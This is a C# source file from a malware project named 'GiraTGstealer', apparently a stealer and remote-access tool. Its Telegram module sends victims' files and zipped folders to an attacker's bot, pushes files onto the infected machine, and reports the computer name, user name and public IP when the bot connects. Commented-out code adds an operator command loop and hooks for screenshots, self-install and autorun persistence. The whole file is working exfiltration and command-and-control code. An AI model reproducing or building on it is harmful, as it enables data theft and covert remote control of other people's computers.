using SimpleJSON;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace GiraTGstealer
{
    internal class telegram
    {
        //public static Thread waitCommandsThread = new Thread(waitCommands);

        public static bool waitThreadIsBlocked = false;

        private static void waitForUnblock()
        {
            while (true)
            {
                if (waitThreadIsBlocked)
                {
                    Thread.Sleep(200);
                    continue;
                }
                else
                {
                    break;
                }
            }
        }

        /*private static void waitCommands()
        {
            waitForUnblock();
            int LastUpdateID = 0;
            string response;
            using (WebClient client = new WebClient())
            {
                response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates");

            }
            LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;
            while (true)
            {
                Thread.Sleep(config.TelegramCommandCheckDelay * 10);
                waitForUnblock();
                LastUpdateID++;
                using (WebClient client = new WebClient())
                {
                    response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates?offset={LastUpdateID}");
                }
                var json = JSON.Parse(response);

                foreach (JSONNode r in json["result"].AsArray)
                {
                    JSONNode message = r["message"];
                    string chatid = message["chat"]["id"];
                    LastUpdateID = r["update_id"].AsInt;

                    if (chatid != config.TelegamChatID)
                    {
                        string username = message["chat"]["username"];
                        string firstname = message["chat"]["first_name"];
                        sendText($"👑 Ты не мой владелец {firstname}", chatid);
                        sendText($"👑 Не известный пользователь с айди {chatid} и тегом @{username}");
                        break;
                    }
                    if (message.HasKey("document"))
                    {
                        string fileName = message["document"]["file_name"];
                        string fileID = message["document"]["file_id"];
                        string pth = message["caption"];
                        if (pth != null && pth != "")
                        {
                            fileName = pth + @"\" + fileName;
                        }
                        JSONNode filePath;
                        using (WebClient client = new WebClient())
                        {
                            filePath = JSON.Parse(client.DownloadString(
                                "https://api.telegram.org/bot" +
                                config.TelegramToken +
                                "/getFile" +
                                "?file_id=" + fileID
                            ))["result"]["file_path"];
                        }
                        DownloadFile(fileName, filePath);
                    }
                    else if (message.HasKey("text"))
                    {
                        string command = message["text"];
                        if (!command.StartsWith("/")) { continue; }
                        Thread t = new Thread(() => commands.handle(command));
                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                    }
                    else
                    {
                        sendText("🍩 Unknown type received. Only Text/Document can be used!");
                    }
                }
            }
        }*/
        public static void sendText(string text, string chatId = config.TelegamChatID)
        {
            waitForUnblock();
            Console.WriteLine(text.Length);
            List<string> texts = new List<string>();
            texts = DivideString(text, 4000);
            using (WebClient client = new WebClient())
            {
                for (int i = 0; i < texts.Count; i++)
                {
                    client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/sendMessage?chat_id={chatId}&text={texts[i]}");
                }

            }
        }
        static List<string> DivideString(string input, int maxLength)
        {
            List<string> resultStrings = new List<string>();

            // Разделяем строку по рядкам
            string[] lines = input.Split('\n');

            // Объединяем строки, чтобы получить части длиной не более maxLength
            string currentPart = "";
            foreach (var line in lines)
            {
                if (currentPart.Length + line.Length <= maxLength)
                {
                    // Добавляем текущий рядок к текущей части
                    currentPart += line + "\n";
                }
                else
                {
                    // Добавляем текущую часть в результат и начинаем новую
                    resultStrings.Add(currentPart.TrimEnd('\n'));
                    currentPart = line + "\n";
                }
            }

            // Добавляем последнюю часть, если она не пуста
            if (!string.IsNullOrEmpty(currentPart))
            {
                resultStrings.Add(currentPart.TrimEnd('\n'));
            }

            return resultStrings;
        }
        public static void DownloadFile(string file, string path = "")
        {
            waitForUnblock();
            /*if(file.StartsWith("http"))
            {
                sendText($"📄 Downloading file \"{Path.GetFileName(file)}\" from url");
                try
                {
                    using (WebClient client = new WebClient())
                        client.DownloadFile(new Uri(file), Path.GetFileName(file));
                }
                catch
                {
                    sendText(String.Format("💥 Connection error"));
                    return;
                }
                sendText($"💾 File \"{file}\" saved in: \"{Path.GetFullPath(Path.GetFileName(file))}\"");
            }
            else
            {
                
            }*/
            sendText($"📄 Downloading file: \"{file}\"");
            path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
            using (WebClient client = new WebClient())
                client.DownloadFile(new Uri(path), file);
            sendText($"💾 File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
        }
        public static void UploadFile(string file, bool removeAfterUpload = false)
        {
            waitForUnblock();
            if (File.Exists(file))
            {
                //sendText("📃 Uploading file...");
                sendFile(file);
                if (removeAfterUpload)
                {
                    File.Delete(file);
                }
            }
            else if (Directory.Exists(file))
            {
                //sendText("📁 Uploading directory...");
                string zfile = file + ".zip";
                if (File.Exists(zfile))
                { File.Delete(zfile); }
                System.IO.Compression.ZipFile.CreateFromDirectory(file, zfile);
                sendFile(zfile);
                File.Delete(zfile);
            }
            else
            {
                sendText("⛔ File not found!");
                return;
            }
        }
        public static void sendFile(string file, string type = "Document")
        {
            waitForUnblock();
            if (!File.Exists(file))
            {
                sendText("⛔ File not found!");
                return;
            }
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent fform = new MultipartFormDataContent();
                var file_bytes = File.ReadAllBytes(file);
                fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
                var rresponse = httpClient.PostAsync($"https://api.telegram.org/bot{config.TelegramToken}/send{type}?chat_id={config.TelegamChatID}", fform);
                rresponse.Wait();
                httpClient.Dispose();
            }
        }
        public static void sendConnection()
        {
            //persistence.MakeScreenshot();
            //UploadFile(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "screen.jpg");
            //persistence.installSelf();
            sendText("🍀 Bot connected" +
                     "\n💻 Computer info:" +
                     "\nComputer name: " + Environment.MachineName +
                     "\nUser name: " + Environment.UserName +
                     "\nPublic ip: " + persistence.getPublicIp() +
                     "\nSystem time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                        "");
            //persistence.setAutorun();
        }
    }
}
